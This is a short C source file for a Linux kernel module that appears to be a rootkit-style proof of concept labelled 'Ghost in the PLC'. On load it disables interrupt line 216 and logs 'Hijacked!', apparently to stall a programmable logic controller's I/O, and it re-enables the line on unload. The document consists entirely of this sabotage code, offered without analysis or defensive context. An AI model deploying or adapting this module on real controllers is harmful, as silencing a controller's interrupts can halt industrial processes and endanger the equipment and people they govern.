#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/interrupt.h>

#define IRQ_LINE	216

int __init init_module(void) {
	disable_irq(IRQ_LINE);
	printk(KERN_INFO "[RK] Hijacked!\n");
	return 0;
}

void __exit cleanup_module(void) {
	enable_irq(IRQ_LINE);
	printk(KERN_INFO "[RK] Exit\n");
}

MODULE_AUTHOR("tu4st");
MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Ghost in the PLC");
